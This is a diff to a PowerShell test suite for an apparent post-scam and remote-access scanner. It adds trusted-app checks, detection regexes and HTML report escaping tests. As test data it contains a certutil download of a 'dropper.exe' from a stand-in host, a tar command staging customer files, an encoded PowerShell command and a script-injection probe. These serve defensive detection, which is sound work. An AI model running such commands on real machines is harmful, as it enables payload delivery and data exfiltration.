@@ -48,6 +48,11 @@ Assert-True (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\App
 Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe' -SignatureStatus 'InspectionFailed' -ArtifactType RunKey -Name Teams -CommandLine 'malware.exe')) 'A Teams-looking Run value without the expected Store URI remains suspicious'
 Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\Teams\current\Teams.exe' -CompanyName 'Microsoft Corporation' -Signer '' -SignatureStatus 'NotSigned')) 'An unsigned Teams-named executable is not trusted'
 Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Roaming\Adobe\Teams.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid')) 'A Teams-named executable outside Microsoft expected folders is still suspicious'
+Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\OpenAI\Codex\bin\x64\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer 'CN=OpenAI OpCo, LLC' -SignatureStatus 'Valid') 'A valid OpenAI-signed Codex executable in its exact application folder is trusted'
+Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\PowerToys\PowerToys.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid') 'A valid Microsoft-signed PowerToys executable in its exact application folder is trusted'
+Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\Mozilla Firefox\firefox.exe' -CompanyName 'Mozilla Corporation' -Signer 'CN=Mozilla Corporation' -SignatureStatus 'Valid') 'A valid Mozilla-signed per-user Firefox executable is trusted'
+Assert-True (-not (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Roaming\OpenAI\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer 'CN=OpenAI OpCo, LLC' -SignatureStatus 'Valid')) 'A signed lookalike outside the exact Codex folder remains reviewable'
+Assert-True (-not (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\OpenAI\Codex\bin\x64\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer '' -SignatureStatus 'NotSigned')) 'An unsigned Codex lookalike remains reviewable'
 
 $remediationSource = Get-Content -LiteralPath (Join-Path $repoRoot 'scripts\RemoteAccessScanAndRemove.ps1') -Raw
 Assert-True ($remediationSource -notmatch '\bScanOnly\b' -and $remediationSource -match '===================== FINDINGS' -and $remediationSource -match 'Show-CandidateSummary') 'Every remote-access scan displays concise product findings and enters technician review'
@@ -69,7 +74,7 @@ Assert-True ($moduleSource -match 'TaskPath\s*= \$task\.TaskPath' -and $moduleSo
 Assert-True ($moduleSource -notmatch "HeuristicReason\s*=\s*'Recent unsigned or invalidly signed executable") 'Unsigned Temp files alone are not treated as remote-access removal candidates'
 Assert-True ($moduleSource -match '\$displayVersion\s*=\s*Get-CompuTekPropertyValue \$p ''DisplayVersion''' -and $moduleSource -match 'DisplayVersion\s+=\s+\$Artifact\.DisplayVersion') 'Installed-program versions are retained in findings for version-aware grouping'
 Assert-True ($moduleSource -match '\$actionableMatches\s*=\s*@\(\$matches \| Where-Object \{\$_.Product.category -ne ''native-feature''\}\)' -and $moduleSource -match 'Post-Scam event evidence handles') 'Ordinary built-in Windows remote features are excluded from removal findings'
-Assert-True ($moduleSource -match 'Test-CompuTekTrustedMicrosoftApplication' -and $moduleSource -match "ArtifactType -eq 'Process'[\s\S]+?ConnectionCount -gt 0[\s\S]+?Test-CompuTekTrustedMicrosoftApplication") 'Signed Teams and OneDrive processes in expected folders are excluded from the generic user-writable network heuristic'
+Assert-True ($moduleSource -match 'Test-CompuTekTrustedApplication' -and $moduleSource -match "ArtifactType -eq 'Process'[\s\S]+?ConnectionCount -gt 0[\s\S]+?Test-CompuTekTrustedApplication") 'Exact signed Teams, OneDrive, Codex, PowerToys, and Firefox applications are excluded from the generic user-writable network heuristic'
 Assert-True ($moduleSource -match 'Get-CompuTekStartupCommandInfo' -and $moduleSource -match 'StartupReinstallRisk' -and $moduleSource -match '\.StartupItems\.csv') 'Every Startup folder item is inventoried and reinstall-capable commands are preserved in separate reports'
 Assert-True ($moduleSource -match 'Get-AppxPackage -AllUsers' -and $moduleSource -match '\$currentUserPackages\s*=\s*@\(Get-AppxPackage' -and $moduleSource -match 'Get-StartApps') 'Store-app collection always combines all-user, current-user, and Start-app registration views'
 Assert-True ($moduleSource -match 'Get-CompuTekPropertyValue \$product ''storeProductIds''') 'Optional Store product IDs are read safely under strict mode'
@@ -580,19 +585,40 @@ Assert-True ($timedOutUninstall.TimedOut -and -not $timedOutUninstall.Success -a
 
 $postScamTokens = $null
 $postScamErrors = $null
-$postScamAst = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $repoRoot 'scripts\PostScam_SystemIntegrityScanner.ps1'),[ref]$postScamTokens,[ref]$postScamErrors)
-foreach ($functionName in @('Test-CompuTekPostScamUserWritableRisk','Test-CompuTekPostScamPersistenceText')) {
+$postScamPath = Join-Path $repoRoot 'scripts\PostScam_SystemIntegrityScanner.ps1'
+$postScamSource = Get-Content -LiteralPath $postScamPath -Raw
+$postScamAst = [System.Management.Automation.Language.Parser]::ParseFile($postScamPath,[ref]$postScamTokens,[ref]$postScamErrors)
+foreach ($functionName in @('Test-CompuTekPostScamUserWritableRisk','Test-CompuTekPostScamPersistenceText','Get-CompuTekDefenderFindingName','ConvertTo-CompuTekHtmlText','Get-CompuTekPostScamCategoryLabel','New-CompuTekPostScamHtmlReport')) {
     $postScamFunction = @($postScamAst.FindAll({param($node) $node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $node.Name -eq $functionName},$true))[0]
     Invoke-Expression $postScamFunction.Extent.Text
 }
 $remoteRegex = '(?i)(screenconnect|anydesk)'
-$suspiciousCommandRegex = '(?i)(encodedcommand|invoke-webrequest)'
+$suspiciousCommandRegex = '(?i)(encodedcommand|invoke-webrequest|\bcertutil(?:\.exe)?\b[^\r\n]*(?:-urlcache|-decode)|\btar(?:\.exe)?\b)'
 $script:PostScamUserWritableTextRegex = '(?i)\\users\\[^\\]+\\(?:appdata|downloads|desktop)\\|\\windows\\temp\\'
-$script:PostScamTrustedMicrosoftPathRegex = '(?i)[a-z]:\\users\\[^\\\r\n"]+\\appdata\\local\\microsoft\\(?:(?:teams\\(?:current\\teams|update))|(?:onedrive\\(?:(?:\d+(?:\.\d+)+\\)?(?:onedrive|onedrivelauncher|onedrivestandaloneupdater|filecoauth)))|(?:windowsapps\\ms-teams))\.exe'
+$script:PostScamTrustedApplicationPathRegex = '(?i)[a-z]:\\users\\[^\\\r\n"]+\\appdata\\local\\microsoft\\(?:(?:teams\\(?:current\\teams|update))|(?:onedrive\\(?:(?:\d+(?:\.\d+)+\\)?(?:onedrive|onedrivelauncher|onedrivestandaloneupdater|filecoauth)))|(?:windowsapps\\ms-teams))\.exe'
 Assert-True (-not (Test-CompuTekPostScamPersistenceText 'Service FileSyncHelper installed under C:\Program Files\Vendor')) 'An ordinary recent service installation is supplemental evidence, not an actionable scam backdoor'
-Assert-True (Test-CompuTekPostScamPersistenceText 'ScreenConnect Client service installed') 'A remote-software service installation remains actionable'
+Assert-True (-not (Test-CompuTekPostScamPersistenceText 'ScreenConnect Client service installed under C:\Program Files\ScreenConnect')) 'A named remote-support service in Program Files is handled by the remote scanner instead of being called a post-scam backdoor'
 Assert-True (Test-CompuTekPostScamPersistenceText 'powershell.exe -EncodedCommand AAAA') 'A suspicious persistence command remains actionable'
 Assert-True (Test-CompuTekPostScamPersistenceText 'C:\Users\Victim\AppData\Roaming\helper.exe') 'Persistence from a user-writable profile path remains actionable'
+Assert-True (-not (Test-CompuTekPostScamPersistenceText 'PowerShell provider started and Firefox was -os-restarted')) 'The word fragment tar inside started or restarted is not mistaken for the tar archive tool'
+Assert-True (-not (Test-CompuTekPostScamPersistenceText 'rundll32.exe shell32.dll,Control_RunDLL')) 'An ordinary Windows rundll32 command is not suspicious by name alone'
+Assert-True (Test-CompuTekPostScamPersistenceText 'certutil.exe -urlcache -f https://example.invalid/dropper.exe') 'A certutil download command remains actionable'
+Assert-True (Test-CompuTekPostScamPersistenceText 'tar.exe -cf customer-files.tar Documents') 'An actual tar staging command remains actionable'
+Assert-True ($postScamSource -match "'Windows PowerShell' -Ids @\(800\)" -and $postScamSource -notmatch "'Windows PowerShell' -Ids @\(400,403,600,800\)") 'Classic PowerShell engine startup and shutdown events are not classified as suspicious commands'
+Assert-True ($postScamSource -match 'hehggadaopoacecdllhhajmbjkdcmajg' -and $postScamSource -match '\$isTrustedExtension') 'The exact official ChatGPT extension ID is retained as supplemental inventory instead of a warning'
+$defenderMessage = "Microsoft Defender found malware.`r`nName: Trojan:Win32/TestThreat`r`nPath: file:_C:\Temp\bad.exe"
+Assert-True ((Get-CompuTekDefenderFindingName -EventId 1116 -Message $defenderMessage) -eq (Get-CompuTekDefenderFindingName -EventId 1117 -Message $defenderMessage)) 'Defender detection and remediation events for the same threat consolidate into one warning group'
+
+$htmlTestPath = Join-Path $env:TEMP ('CompuTek-PostScam-' + [Guid]::NewGuid().ToString('N') + '.html')
+try {
+    $htmlFinding = [pscustomobject]@{Severity='High';Category='SecurityControl';Name='<script>alert(1)</script>';Occurrences=2;LatestTimeUtc='2026-08-28T18:00:00Z';Path='C:\Evidence\item.exe';Details='Detected & blocked';Sources='Defender'}
+    [void](New-CompuTekPostScamHtmlReport -OutputPath $htmlTestPath -ActionableGroups @($htmlFinding) -SupplementalRecords @() -CollectionGaps @('Security log unavailable') -Cutoff ([datetime]'2026-08-21') -ComputerName 'TEST-PC')
+    $htmlTestContent = Get-Content -LiteralPath $htmlTestPath -Raw
+    Assert-True ($htmlTestContent -match '<!doctype html>' -and $htmlTestContent -match 'Technician review needed' -and $htmlTestContent -match '&lt;script&gt;alert\(1\)&lt;/script&gt;') 'The easy-to-read report is created and safely encodes collected evidence'
+    Assert-True ($htmlTestContent -notmatch '<script>alert\(1\)</script>' -and $htmlTestContent -match 'Supplemental leads saved' -and $htmlTestContent -match 'Collection gaps') 'The HTML report separates warnings, supplemental leads, and collection gaps'
+} finally {
+    Remove-Item -LiteralPath $htmlTestPath -Force -ErrorAction SilentlyContinue
+}
 
 if ($script:Failures -gt 0) {
     Write-Host "$script:Failures test(s) failed." -ForegroundColor Red
